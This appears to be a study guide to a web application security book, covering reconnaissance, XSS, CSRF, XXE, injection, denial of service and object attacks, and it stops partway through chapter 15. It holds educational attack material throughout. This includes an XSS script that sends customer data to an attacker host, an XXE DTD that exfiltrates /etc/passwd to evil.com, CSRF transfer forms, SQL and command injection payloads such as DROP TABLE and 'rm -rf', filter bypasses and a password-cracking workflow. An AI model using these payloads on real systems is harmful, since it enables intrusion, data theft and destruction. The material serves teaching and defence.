The last risk signal is re-inventing existing technology. It usually starts as an organisational problem and shows up in the architecture. The book’s list of reasons teams rebuild instead of adopting: avoiding complicated licences, adding functionality the existing tool lacks, marketing a new in-house feature — and the honest one, that building something from scratch is more fun and challenging than integrating someone else’s tool. Reinvention is not automatically bad; it must be evaluated case by case. But hand-rolled crypto, auth, parsers and session handling are where the worst bugs live.

Chapter 8 · Part I Summary

Recon ends when you have a map you can prioritise from — and a recorded toolkit you can automate, teach and improve.

  • Keep evolving techniques — they get stale. Server packages have become much better at not leaking their name and version, so header-based detection is worth less than it used to be.
  • Basics never disappear, technologies do — you will keep needing to map whatever is current, and you will still meet legacy stacks.
  • Record your techniques, not just your findings — a documented method can become automation, can be taught, and can be improved. Too much recon knowledge stays locked inside individual testers’ heads.
  • Share what you invent — the techniques help pen testers, and often end up improving application security for everyone.
What Part I implies for defenders

If your security depends on attackers not finding a host, an endpoint, a version or an architectural weakness, you do not have security — you have luck. Part I is a list of everything an attacker will learn about you before they send a single malicious payload; every item on it is something you can inventory, harden or remove first.

Recon cheat sheet (Part I in one table)

GoalTechniqueWhat you get
Understand the appRead the product as a businessWhich data and features actually matter
Reason about roles (RBAC)The privileged interfaces that must exist behind the UI
Find hostsDevTools → Network tabEvery domain the app talks to
Search operators (site:, -inurl:)Indexed pages never linked from navigation
Archive.org snapshots + “view source”Hosts and paths that were removed from the live app
host -l domain ns1.… (zone transfer)The entire DNS zone, if the server is misconfigured
Find hosts (last resort)Brute force / dictionary with dns.resolve in parallelNon-standard subdomains
Map the APIWatch XHR/fetch trafficEndpoints, ids, tokens and payload shapes
OPTIONS / verb fuzzingWhich HTTP verbs each endpoint accepts
Read the auth headerBasic / Digest / Bearer / custom token
Compare against public specsExpected payload shape (e.g. OAuth 2.0)
Fingerprint the stackEmber.VERSION, React.version, Vue.version, ng-versionClient framework + version
getScripts() / getStyles()Every third-party script and stylesheet
Headers, 404 pages, git history, id formatsServer software, framework version range, database type
Judge the architectureLook for shared secure utilities vs per-endpoint checks; count the layers that validateWhere the next vulnerabilities will be

Defender’s version: make each technique useless

Not part of the book’s Part I — this is the mirror image, derived from the same techniques. Each row undoes one recon advantage.

Recon techniqueDefence
Zone transferAllow AXFR only from authorised secondary servers; monitor for attempts.
Subdomain discoveryInventory hosts yourself, retire unused ones, and keep staging/dev off the public DNS.
Search engines and archivesDon’t publish what should not be public; remember that removing it later does not remove the copy.
Brute forcing / dictionaryRate limiting and alerting at the DNS and edge layers.
Version fingerprintingStrip Server and X-Powered-By, replace default error and 404 pages, keep libraries current.
Client-side version globalsBuild production bundles that don’t expose version constants; use SRI for CDN scripts.
Verb fuzzingDisable unused HTTP methods, enforce authorisation on every verb, log 4xx storms.
Payload-shape guessingValidate and reject unexpected fields; do not echo internal error details.
Architecture signalsCentralise security utilities (validation, encoding, authorisation) so no endpoint can forget them.
Part II

Offense

Chapters 9–19 of Web Application Security: Exploitation and Countermeasures (Andrew Hoffman, 2nd ed. 2024). Part I built the map; Part II breaks into it. Eleven chapters, ten attack families — XSS, CSRF, XXE, injection, denial of service, object attacks, client-side attacks, dependency attacks and business-logic abuse — each explained simply, with the book’s own figures, code and payloads.

Chapters 9–19 Book pages 113–228 19 figures Runs on the Part I map

Part II in one page

Every attack in Part II is one story told ten ways: the application treated something as trusted that the attacker controls. Data became code (XSS, injection), a request became intent (CSRF), a file became a command (XXE), an object key became a permission (mass assignment), a rule became a money printer (business logic).

ChapterAttackThe one-sentence version
10XSSThe browser runs the attacker’s script as if it were your application’s.
11CSRFThe victim’s browser sends a request the victim never intended.
12XXEA malicious XML document makes the parser read server files — or call out to the attacker.
13InjectionInput reaches an interpreter (SQL, a CLI, the OS) and is read as instructions.
14DoSThe attacker spends one request to burn a lot of your resources.
15Mass assignment / IDOR / serializationObjects are written with fields the developer never expected, or read with ids they never authorised.
16Prototype pollution / clickjacking / tabnabbingThe attack lives entirely in the browser and never touches your server.
17Dependency attacksThe weakest code in your stack is the code you did not write.
18Business logicThe code does exactly what it says — and that is the vulnerability.
Scope

Everything in Part II is described for authorised testing, red-teaming and defence — the book says this repeatedly. Only test systems you own or have explicit written permission to test.

Why a defender should read Part II at all

Each chapter ends with an implicit question about your own application: does any endpoint take a string and put it in the DOM? Does any state change work over a GET? Does any parser accept XML? Does any query get built by concatenation? Part III answers those questions with fixes; Part II is where you learn which fixes actually matter — and the book warns in its own summary that defences are “mitigations”, not bulletproof fixes.

Chapter 9 · Introduction to Hacking Web Applications

Hacking is mostly reading and pattern-spotting, not magic: engineers measure a day by features shipped, hackers measure it by clues found.

The hacker’s mindset

  • Productivity looks different. A developer says “I shipped features x and y”. A hacker’s day is mostly data gathering and analysis, full of false positives — it looks like wasted time to an outsider.
  • Hackers rarely modify software. They analyse the existing codebase and look for entry points that are already there.
  • Every codebase contains exploitable bugs. A good hacker stays alert for clues rather than for a specific bug.
  • Long dry spells are normal. Weeks or months of analysis before a usable entry point appears — so keep a record of what you tried and what you learned.
  • Keep learning. Techniques go stale as the web adapts.
  • The ladder: a hacker is a detective; a good hacker is an organised detective; a great hacker adds technical skill; a master hacker keeps adapting.

Applied recon — why Part I is not over

  • API type — most payloads in Part II are delivered over REST APIs, so knowing that an app is REST-first tells you how to shape a request.
  • Endpoints — one endpoint that ignores your permission may not be interesting; /users/1234/settings probably is.
  • Code reuse across a company — an exploit found on one subdomain often works on another, because teams copy each other.
  • Authentication scheme — authenticated users get a superset of functionality, and those requests run with more privilege, so most interesting attacks happen inside a session.
  • Dependencies — public exploits against third-party libraries are often copy-and-paste jobs.
  • Architecture — if application B is untouchable but application A talks to it, attack A to reach B.
The book’s framing

Recon and offence are each interesting on their own, and far more valuable together. Part II exists because a payload with no target is useless, and a target with no payload is just a map.

Chapter 10 · Cross-Site Scripting (XSS)

XSS is what happens when your application’s data becomes your application’s code: the browser executes the attacker’s script with all the powers your own JavaScript has, inside a real user’s session.

The book opens with a story that makes the whole class obvious. An unhappy customer types feedback into MegaBank’s support portal. The form has no bold button, so they try HTML:

The innocent version — a customer just wants bold textbook example
I am not happy with the service provided by your bank.
I have waited 12 hours for my deposit to show up in the web application.
<strong>Please improve your web application.</strong>
Other banks will show deposits instantly.

It works — the text is bold. The support rep even asks how. That single success proves the application renders user input as DOM instead of text, and the same door takes a script:

  • Submit User sends a comment through a web form.
  • Store The comment is saved in the database as text.
  • Retrieve One or many users request the comment over HTTP.
  • Inject The comment is placed into the page — as markup.
  • Execute The browser interprets the injected markup as DOM and runs the script.

And this is the developer habit that causes it — one line, innerHTML:

The exact mistake: appending a string as DOM instead of as textvulnerable
const comment = 'my <strong>comment</strong>';
const div = document.createElement('div');
div.innerHTML = comment;          // interpreted as DOM, not text

const wrapper = document.querySelector('#commentArea');
wrapper.appendChild(div);

Then the book turns the same bug into an actual weapon. Posted as a support comment, this script runs in the support rep’s browser, reads the privileged customer data on that screen and posts it to the attacker’s server:

Stored XSS payload — exfiltrating the support rep’s datamalicious payload
<script>
  // get a list of all customers from the page
  const customers = document.querySelectorAll('.openCases');
  const customerData = [];

  customers.forEach((customer) => {
    customerData.push({
      firstName: customer.querySelector('.firstName').innerText,
      lastName:  customer.querySelector('.lastName').innerText,
      email:     customer.querySelector('.email').innerText,
      phone:     customer.querySelector('.phone').innerText
    });
  });

  // exfiltrate the collected data to the attacker's server
  const http = new XMLHttpRequest();
  http.open('POST', 'https://steal-your-data.com/data', true);
  http.setRequestHeader('Content-type', 'application/json');
  http.send(JSON.stringify(customerData));
</script>
Why this is so nasty

The script tags are invisible in the rendered comment — the rep sees only the polite complaint. No click required: a script tag that reaches the DOM is executed immediately. And because the payload is stored, every rep who opens the comment is attacked.

What an XSS attack can do

  • Run a script in the browser that the application owner never wrote.
  • Run silently, with no visibility and no user interaction to start it.
  • Read any data present in the current page — often more than the victim realises.
  • Send data out, and pull further code in, from the attacker’s server.
  • Steal session tokens → account takeover.
  • Draw DOM elements over the real UI → near-perfect phishing that a non-technical user cannot detect.

Stored, reflected, DOM-based — and mutation-based

The book introduces the big three (stored, reflected, DOM-based) and later adds a fourth (mutation-based). The mental model:

  • Stored — easiest to detect (it sits in your database) and often the most dangerous (one payload, many victims). A featured video title with a stored XSS could hit every visitor for as long as it is featured. Because the payload is stored server-side as text, scanning database entries for script is a cheap mitigation — but not a fix: payloads can be encoded (base64, binary) or split across fields and only become dangerous when a service concatenates them.
  • Reflected — the server echoes the payload back without storing it. Harder to find, easier to disguise: the book shows a page of three “helpful” links where the third carries the payload in a query string.
  • DOM-based — no server involvement at all: a source (something that holds text, e.g. window.location.hash) flows into a sink (something that executes text, e.g. document.write or innerHTML).
  • Mutation-based (mXSS) — the payload passes the filter, then the browser’s parser “corrects” it into something executable.
Reflected: the payload rides in the query stringpayload
https://support.mega-bank.com/search?query=open+<script>alert(test);</script>checking+account
DOM XSS: hash (source) → document.write (sink), no server involvedvulnerable
const hash = document.location.hash;
const funds = [];
const nMatches = findNumberOfMatches(funds, hash);

// the hash is written into the DOM as markup
document.write(nMatches + ' matches found for ' + hash);

// attacker link:
// investors.mega-bank.com/listing#<script>alert(document.cookie);</script>
Why DOM XSS is the hardest to catch

The traffic never leaves the browser, so server-side scanners see nothing. It also depends on the browser and version: a bug in one DOM implementation may not exist in another, so a company supporting many browsers can struggle even to reproduce the report.

Mutation-based XSS (mXSS)

Named by Mario Heiderich’s paper on innerHTML mutations. The idea: a payload that is safe when the filter inspects it, and unsafe after the browser has optimised and re-parsed the DOM. The book’s example is Masato Kinugawa’s 2019 bypass of DOMPurify inside Google’s Closure library:

The payload that looked safe… and what the browser made of itmXSS
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// after the browser re-parses it:
<noscript><p title="</noscript>
<img src="x" onerror="alert(1)">">

Why it worked: DOMPurify sanitises inside a <template> element, where scripting is disabled. In that context <noscript> exposes its children as elements, so the img onerror could not fire. Once the string left the sanitizer and entered a real browser (scripting enabled), <noscript> stopped doing anything, the broken <p title=" was discarded, and the image handler became live. Filters that were considered robust — DOMPurify, OWASP AntiSamy, Google Caja — have all been bypassed this way.

Bypassing filters

Only a small fraction of sites use best-in-class sanitisation, so most filters are homemade blocklists — and the DOM/JS specs are big enough to walk around them.

TrickWhy it worksExample
Self-closing / unclosed tagsThe browser repairs broken markup, so a filter that looks for tag pairs misses it<script>alert() becomes <script>alert()</script>
Protocol-relative URLs//host lets the browser choose the scheme, so filters looking for http(s):// miss it<a href="//evil-website.com">
Malformed tagsChrome restores quotes and attributes before rendering<IMG """"><SCRIPT>alert("XSS")</SCRIPT>"\>
Encoding escapesUnicode is a valid alternative spelling of any Latin character\u0061lert(1) = alert(1)
Polyglot payloadsOne payload that executes in many contexts saves per-context guessingthe 2018 jaVasCript: polyglot by 0xSobky
Unicode spelling — same script, no matching keywordbook code
alert(1);                          // blocked: the filter knows this string
\u0061lert(1);                     // alert(1), substituting the "a"
a\u006cert(1);                     // alert(1), substituting the "l"
\u0061\u006c\u0065\u0072\u0074(1); // alert(1), all characters

Chapter 11 · Cross-Site Request Forgery (CSRF)

CSRF doesn’t steal the session — it borrows it. The victim’s own browser, already logged in, is tricked into sending a request the victim never intended.

The two identifying marks of a CSRF attack, per the book: privilege escalation (an action the attacker could not perform alone) and stealth (the account that performs it never knows). It works because browsers automatically attach a site’s cookies to any request that site receives — no matter who wrote the page that triggered the request.

Anatomy of the request

A GET is just a line of text — which is what makes it so forgeablebook code
GET /resource-url?key=value HTTP/1.1
Host: www.mega-bank.com

The book then builds the vulnerable server in ExpressJS, first harmlessly:

A harmless reflective route (and what it teaches)book code
app.get('/account', function(req, res) {
  if (!req.query) { return res.sendStatus(400); }
  return res.json(req.query);
});

…and from the browser, with and without params:

Same request, with params attachedbook code
const xhr = new XMLHttpRequest();
const params = 'id=12345';
xhr.onreadystatechange = function() {
  console.log(xhr.responseText);
};
xhr.open('GET', `https://www.mega-bank.com/account?${params}`, true);
xhr.send();

// response: { id: 12345 }  with HTTP 200

Now the same pattern, but the query parameters change state — a money transfer:

The dangerous version: a GET that moves moneyvulnerable
app.get('/transfer', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }
  if (!req.query.to_user) { return res.sendStatus(400); }
  if (!req.query.amount)  { return res.sendStatus(400); }

  transferFunds(session.currentUser, req.query.to_user, req.query.amount,
    (error) => {
      if (error) { return res.sendStatus(400); }
      return res.json({
        operation: 'transfer',
        amount: req.query.amount,
        from: session.currentUser,
        to: req.query.to_user,
        status: 'complete'
      });
    });
});

The route checks privileges and checks that a recipient exists — so it looks secure. But it never verifies that the person clicking meant to do it, and a GET can be triggered by anything:

The one-line attack linkpayload
<a href="https://www.mega-bank.com/transfer?to_user=attacker&amount=10000">click me</a>

Alternate GET payloads

Any tag with an src makes the request as soon as it loads — no click needed. An invisible pixel is enough:

An 0×0 image that transfers moneypayload
<img src="https://www.mega-bank.com/transfer?to_user=attacker&amount=10000"
     width="0" height="0" border="0">

<video width="1280" height="720" controls>
  <source src="https://www.mega-bank.com/transfer?to_user=attacker&amount=10000"
          type="video/mp4">
</video>

CSRF against POST endpoints

POST requires a little more work and, usually, one user interaction — because a plain HTML form can POST without any JavaScript:

Hidden fields do the damage; visible fields do the actingpayload
<form action="https://www.mega-bank.com/transfer" method="POST">
  <input type="hidden" name="to_user" value="attacker">
  <input type="hidden" name="amount"  value="10000">
  <input type="text"     name="username" value="username">
  <input type="password" name="password" value="password">
  <input type="submit"   value="Submit">
</form>

The victim sees a plausible login form; submitting it never logs in anywhere — it fires the transfer, using the session the victim already has at MegaBank. The book also notes a variant that reaches internal networks: the attacker cannot reach the intranet, but the victim’s browser can, so a form submitted by an insider makes the request for them.

Bypassing CSRF defences

  • Header validation — defences that check Referer or Origin can be defeated by removing the header: rel="noreferrer" on a link or a form makes the browser omit the referrer, and the server then compares against null/undefined. The book’s blunt opinion: headers are easily forged or stripped and should not be a first-line security measure.
  • Token pools — if tokens are validated from a shared pool rather than tied to a session, you can mint a valid token from your own account and reuse it. Tokens are also readable from DevTools on a test account.
  • Weak tokens — predictable tokens (dates, times, usernames, counters) are forgeable. The book’s example: 1691434927 and 1691434928 are just Unix timestamps.
Replaying a “valid” token of your ownbook code
curl https://website.com/auth -H "anti-csrf-token": "12345abc"

Chapter 12 · XML External Entity (XXE)

XML lets a document define its own entities. If the parser resolves external ones, the document can read files off your server — or send them to the attacker.

XML documents can reference entities declared in a document type definition (DTD). Some are built in; the dangerous ones are custom, and the most dangerous of all point outside the document:

One line of XML that reads a Linux password filepayload
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>

Direct XXE — the app parses your XML and answers with it

The book’s example is a “send screenshot to support” feature: the browser serialises the current page DOM to XML, posts it to a utility service that converts XML → JPG, and forwards the image to support.

Client: serialise the DOM and post it as XMLbook code
const screenshot = function() {
  try {
    const div = document.getElementById('content').innerHTML;
    const serializer = new XMLSerializer();
    const dom = serializer.serializeToString(div);

    const xhr = new XMLHttpRequest();
    const url = 'https://util.mega-bank.com/screenshot';
    const data = new FormData();
    data.append('dom', dom);

    xhr.onreadystatechange = function() {
      sendScreenshotToSupport(xhr.responseText, (err) => {
        if (err) { alert('could not send screenshot.'); }
        else     { alert('screenshot sent to support!'); }
      });
    };
    xhr.send(data);
  } catch (e) {
    alert('Your browser does not support this functionality. Consider upgrading.');
  }
};
Server: receives the XML and hands it to a parserbook code
import xmltojpg from './xmltojpg';

app.post('/screenshot', function(req, res) {
  if (!req.body.dom) { return res.sendStatus(400); }
  xmltojpg.convert(req.body.dom)
    .then((err, jpg) => {
      if (err) { return res.sendStatus(400); }
      return res.send(jpg);
    });
});

Under normal use this is harmless. But the “DOM” being sent is just a string, and a client can send any string it likes — no browser required:

Forging the request with your own XMLpayload
const xhr = new XMLHttpRequest();
xhr.open('POST', utilAPI.url + '/screenshot');
xhr.setRequestHeader('Content-Type', 'application/xml');

const rawXMLString = `<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>`;

xhr.onreadystatechange = function() {
  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
    // check response data here
  }
};
xhr.send(rawXMLString);

If the parser has external entities enabled, the “screenshot” comes back containing the text of /etc/passwd.

Indirect XXE — you never send XML at all

An API can accept plain JSON and still use an XML parser internally: the server converts your payload to XML because the enterprise system it talks to (CRM, accounting, HR) only speaks XML. That conversion is invisible from outside — and still vulnerable. Discovering it takes inference: research the company’s known enterprise vendors, look for third-party URLs, or notice data formats that only make sense if an old system is behind the API.

Out-of-band exfiltration

Sometimes the response contains nothing useful even though the parser is vulnerable. Then you make the server send the data to you. Host a DTD on your own server, reference it from the payload, and have it stream a file out over FTP (or HTTP/LDAP in some environments):

Payload → your DTD → your FTP logspayload
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % dtd SYSTEM "https://evil.com/data.dtd">
  %asd;
  %c;
]>
<a>&rrr;</a>

<!-- data.dtd, hosted on the attacker's server -->
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">

The account-takeover workflow

The book’s most powerful XXE pattern: a chain of small file reads that ends in a shell.

  • Read /etc/passwd — one line per user, seven colon-separated fields: username, password location (x = hash lives in /etc/shadow), UID, GID, comment, home directory, shell. This alone leaks accounts, homes and groups.
  • Read /etc/shadow — line two of each entry holds the hash as $id:$salt:$hash. The $id tells you the algorithm: $1$ MD5, $2a$/$2y$ Blowfish, $5$ SHA-256, $6$ SHA-512, $y$ yescrypt.
  • Crack the hash — format the two files with unshadow, then run John the Ripper or Hashcat. This is CPU/GPU-heavy: John uses one or the other, Hashcat can use both.
  • Log in — with username and password, ssh user@host. The attacker now controls a real account on the server.
The cracking workflow in five linesbook code
# 1. save the stolen files locally
passwd.txt   shadow.txt

# 2. merge them into a format the cracker understands
unshadow passwd.txt shadow.txt > passwords.txt

# 3. crack, then show the plaintext
john passwords.txt
john --show passwords.txt
The lesson for defenders

XXE is often a one-line misconfiguration and needs no exploit chain at all — which is exactly why it is worth trying on every application that touches XML, and why disabling DTDs and external entities is such a cheap fix.

Chapter 13 · Injection

Injection always has two parts: an interpreter and a payload fed into it. SQL is the famous case, but a CLI or the operating system works just as well.

SQL injection

The book starts with PHP — because PHP’s relaxed mixing of SQL, HTML and logic produced a generation of vulnerable code. An old-school login:

Old-school PHP login: SQL built by concatenationvulnerable
<?php
  // ... form HTML, then on POST:
  $database = new mysqli($servername, $username, $password, $database, $dbport);

  $sql = "SELECT userId, username, admin, moderator FROM users WHERE username = '"
       . $_POST['username'] . "' AND password = '" . sha1($_POST['password']) . "';";

  $result = mysqli_query($database, $sql);
?>

This is also why injection numbers fell: as PHP tightened its standards and lost popularity, SQL injection dropped from nearly 5% of all vulnerabilities in 2010 to under 1% today (NVD). The lesson survived into other languages — but the same mistake is easy to make in a modern Node service:

The same bug in a Node/Express endpointvulnerable
app.post('/users', function(req, res) {
  const user_id = req.body.user_id;

  await sql.connect('mssql://username:password@localhost/database');
  const result = await sql.query('SELECT * FROM users WHERE USER = ' + user_id);

  return res.json(result);
});

Three payloads, three levels of damage:

From “show me everything” to “change my account”payloads
// 1. truthy — returns every user
user_id = '1=1'
// SELECT * FROM users WHERE USER = true

// 2. destructive — appends a second statement
user_id = '123abc; DROP TABLE users;'
// SELECT * FROM users WHERE USER = 123abc; DROP TABLE users;

// 3. quiet escalation — give yourself credits
user_id = '123abc; UPDATE users SET credits = 10000 WHERE user = 123abc;'

Code injection — the interpreter need not be SQL

Most applications use a database, so most injection is SQL. But any interpreter reachable from an API is a target. The book’s example is a media service with uploadImage, uploadVideo, getImage and getVideo:

uploadImage: the filename is the injection pointbook code
app.post('/uploadImage', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  // write the raw image to disk
  fs.writeFileSync(`/images/raw/${req.body.name}.png`, req.body.image);

  const compressImage = async function() {
    const res = await imagemin([`/images/raw/${req.body.name}.png`],
                                `/images/compressed/${req.body.name}.jpg`);
    return res;
  };

  const res = await compressImage();
  return res.status(200)
    .json({ url: `https://media.mega-bank.com/images/${req.body.name}.jpg` });
});

It looks like a badly written API endpoint with a filename-collision edge case: send name = main_logo.png and you overwrite the front page’s logo. But imagemin invokes imagemin-cli — so this is injection through an unsanitised CLI.

The video endpoint makes the pattern explicit — user-controlled options are concatenated into a shell command:

Options appended straight into a commandvulnerable
const defaultOptions = '-s 1280x720';

app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  const videoData = req.body.video;
  const videoName = req.body.name;
  const options   = defaultOptions + req.body.options;

  exec(`convert -d ${videoData} -n ${videoName} -o ${options}`);
});
Valid options… and then the same field used to add a commandpayload
const options = '-c h264 -ab 192k';                               // intended
const options = '-c h264 -ab 192k \\ convert -dir /videos -s 1x1'; // injected

Whether injected text starts a new command depends on the CLI: some accept several commands per line, others break on newlines, spaces or &&. And if the command runs in Bash rather than inside a contained tool, escaping one quote is enough to reach the OS itself:

Code injection becomes command injectionpayload
const options = "' && rm -rf /videos";

// what the host OS then runs:
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos

Why command injection is the worst case

Over 95% of servers are Unix-based, so shell access usually means access to files like /etc/passwd, /etc/shadow, ~/.ssh (keys to other systems), /etc/apache2/httpd.conf and /etc/nginx/nginx.conf — read and write. From there the book lists the escalation ladder: steal data, rewrite logs to hide tracks, add a database user for later, delete files, wipe the box, abuse the server’s integrations (e.g. its Sendgrid keys for spam), turn a login form into a phishing form, or lock the admins out and blackmail them.

A “safe converter” that still ends in a shellvulnerable
app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  fs.writeFileSync(`/videos/raw/${req.body.name}`, req.body.video);

  safe_converter.convert(`/videos/raw/${req.body.name}`,
                         `/videos/converted/${req.body.name}`)
    .then(() => {
      // the cleanup line is the vulnerability
      exec(`rm /videos/raw/${req.body.name}`);
      return res.sendStatus(200);
    });
});
The filename is the payloadpayload
const name = 'myVideo.mp4 && rm -rf /videos/converted/';

Getting data back out of an injection

TechniqueHow it worksWhen you use it
In-bandThe payload’s result appears in the response you get backThe easy case — output is reflected
Out-of-band (OOB)The database makes an HTTP (or DNS) request to your server, carrying the data — e.g. UTIL_HTTP.request('https://evil.com', …)Nothing is reflected, but the DB can reach the internet
Inferential / blindAsk true/false questions and observe timing or errors, e.g. WAITFOR DELAY '0:0:30'No output, no outbound access — slow but still conclusive
Blind injection: prove execution with timebook code
const payload = `user_id=1or1=WAITFOR DELAY '0:0:30'`;
const url = `https://megabank.com/update?${payload}`;

updateUser(url, (result) => {
  // nothing is displayed, but the response is delayed 30 seconds
  console.log(result);
});

Bypassing defences: blocklists are the usual improvised defence for non-SQL interpreters (CLIs have no prepared statements). They are weak because specs change and inputs can be masked — the same command can be written many ways that a keyword filter will not recognise.

Chapter 14 · Denial of Service

Availability is part of security. If one cheap request can burn a lot of your server, the attacker wins — no data theft required.

Regex DoS

Regular expressions validate fields everywhere, and they are usually fast. But a “greedy” regex can be crafted to backtrack catastrophically. The book’s demonstration pattern is /^((ab)*)+$/:

Same regex, two inputs — one harmless, one exponentialbook example
/^((ab)*)+$/

'ababababababab'    → instant    // valid: matches cleanly
'abababababababa'   → very slow  // one extra 'a' forces exhaustive backtracking

With a failing trailing character, the engine tries every possible grouping — (abababababababa), (ababababababa)(ba), … — before concluding the string does not match. The measured growth is brutal:

Malicious input (odd length)Execution timeSafe input (even length)Execution time
23 chars8 ms22 chars<1 ms
25 chars15 ms24 chars<1 ms
27 chars31 ms26 chars<1 ms
29 chars61 ms28 chars>1 ms

Time doubles roughly every two characters. On a server that gets expensive fast; in a browser it can freeze the tab entirely. The nasty part: the vulnerable regex can sit in production for years, harmless until someone finds the matching input — so OSS is disproportionately exposed, because few reviewers can spot a malicious regex.

Logical DoS

Here the attacker abuses normal features to make the server do expensive work. First look for resource-heavy operations: anything synchronous, database writes, disk writes, SQL joins, backups, loops.

One request that triggers four expensive thingsbook example
POST /uploadPhoto
  → database write   (photo metadata)
  → disk write       (upload log)
  → SQL join         (user + albums + metadata)
  → file backup      (disaster recovery copy)

You cannot time the server’s internals directly, but you can scale the work by scaling your account. The book’s measurement of GET /metadata/:userid:

Account archetypeResponse time
New account (1 album, 1 photo)120 ms
Average account (6 albums, 60 photos)470 ms
Power user (28 albums, 490 photos)1,870 ms

So the attacker inflates an account (600 albums, 3,500 photos — scripted re-uploads) and then hammers that one endpoint. Even if the request times out, the database is often still working.

Distributed and advanced variants

  • DDoS — botnets (real machines owned by real people, controlled by malware) hammer the IP rather than a specific endpoint, usually with raw UDP traffic to exhaust bandwidth. Hard to block because the traffic looks like real users.
  • YoYo attacks — abuse autoscaling: flood → the cloud scales up → stop → it scales down → repeat. The user experience degrades during every reallocation and your cloud bill explodes. Denial of wallet.
  • Compression attacks — a malformed upload that makes the compressor (FFMPEG, ImageMagick) burn CPU and memory. The book cites CVE-2021-38094: a crafted video triggering an integer overflow in FFMPEG 4.1’s filter_sobel() (in libavfilter/vf_convolution.c), leading to runaway CPU/memory and a crash. Third-party upload handlers are a huge surface area.
  • Proxy-based DoS — use someone else’s compute: create thousands of subdomains proxying to the target so search-engine crawlers keep re-indexing the same content, pushing their traffic at the victim. The attacker pays nothing.
Where to look

The book’s advice: work out which server resources are most valuable for this application — usually RAM/CPU, but sometimes something bespoke like a queue (user a → user b → user c) — then find the APIs that consume them.

Chapter 15 · Attacking Data and Objects

Objects are first-class citizens: they can be created, passed, merged and returned. That convenience is also the attack surface.

Mass assignment

Also called autobinding (Spring MVC, ASP.NET) or object injection (legacy PHP). The bug: a function accepts an object and trusts every key in it.

MegaGame: the endpoint and the unvalidated writervulnerable
app.post("updatePlayerData", function(req, res, next) {
  if (!!req.body.data) {
    db.update(session.currentUser, req.body.data);
    return res.sendStatus(200);          // success
  } else {
    return res.sendStatus(400);          // error
  }
});

const update = function(data) {
  for (const [key, value] of Object.entries(data)) {
    database.upsert({ `${key}`: `${value}` });
  }
};

The problem is not the upsert — it is the missing key validation. The developer expects game state; the attacker adds one field:

The payload is one extra keypayload
const data = {
  playerId: 123,
  playerPosition: { "x": 125, "y": 346 },
  playerHP: 90,
  isAdmin: true          // ← the attack
};

The update() loop happily writes isAdmin into the user row: privilege escalation from a single extra JSON key.

Insecure Direct Object Reference (IDOR)

Added to the OWASP Top 10 in 2007, less common now, still trivially easy: the server trusts an identifier supplied by the user without checking that this user may touch that object.

A file endpoint that returns whatever you namevulnerable
app.get('/files/:id', function(req, res, next) {
  return res.sendFile(`/filesystem/files/${req.params.id}`);
});

// intended:  GET https://mywebsite.com/files/my-report-card.txt
// attack:    GET https://mywebsite.com/files/other-report-card.txt

Intercept the request (DevTools, Burp Suite, ZAP) and change the filename. If it comes back, you have read someone else’s data — a privilege escalation achieved by editing one string.

Serialization attacks

Data has to be serialised to travel. When a serializer fails to escape its output properly, the resulting blob can execute when something downstream evaluates it:

The serialized-farmer idea: an object becomes a string, then backbook example
{
  "name": "Joe Carrot",
  "age": 62,
  "location": "Montana, USA",
